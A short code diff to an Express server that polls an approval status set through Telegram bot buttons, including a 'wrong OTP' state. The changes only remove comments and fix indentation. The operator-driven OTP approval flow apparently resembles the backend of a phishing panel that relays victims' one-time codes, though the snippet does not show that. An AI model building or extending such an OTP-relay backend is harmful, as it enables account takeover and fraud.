@@ -6,8 +6,8 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const BOT_TOKEN = process.env.BOT_TOKEN; // Replace with your
-const CHAT_ID = process.env.CHAT_ID; // Replace with your Telegram chat ID
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 let latestStatus = "pending"; // Tracks approval status
 
@@ -111,7 +111,7 @@ app.post('/webhook', async (req, res) => {
         } else if (action.startsWith("decline")) {
             latestStatus = "declined";
         }  else if (action.startsWith("wrong") || action.startsWith("otp_wrong")) {
-    latestStatus = "wrong_otp";
+            latestStatus = "wrong_otp";
 }
         
         // Acknowledge click to Telegram so loading wheel stops on the button
